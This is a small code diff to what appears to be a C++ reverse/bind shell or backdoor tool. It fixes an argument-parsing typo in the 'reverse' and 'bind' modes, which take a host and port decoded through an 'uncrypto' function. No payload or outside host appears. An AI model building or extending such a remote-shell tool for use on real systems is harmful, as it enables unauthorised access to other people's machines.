@@ -23,7 +23,7 @@ int main(int argc, char *argv[])
     if (argc > 1) {
         std::string host, port;
 
-        if (std::string(argc[1]) == "reverse") {
+        if (std::string(argv[1]) == "reverse") {
             if (argc >= 4) {
                 host = uncrypto(argv[2]);
                 port = uncrypto(argv[3]);
@@ -40,7 +40,7 @@ int main(int argc, char *argv[])
                 repeater();
 
             close(sock);
-        } else if (std::string(argc[1]) == "bind") {
+        } else if (std::string(argv[1]) == "bind") {
             if (argc >= 3)
                 port = uncrypto(argv[2]);
             else {
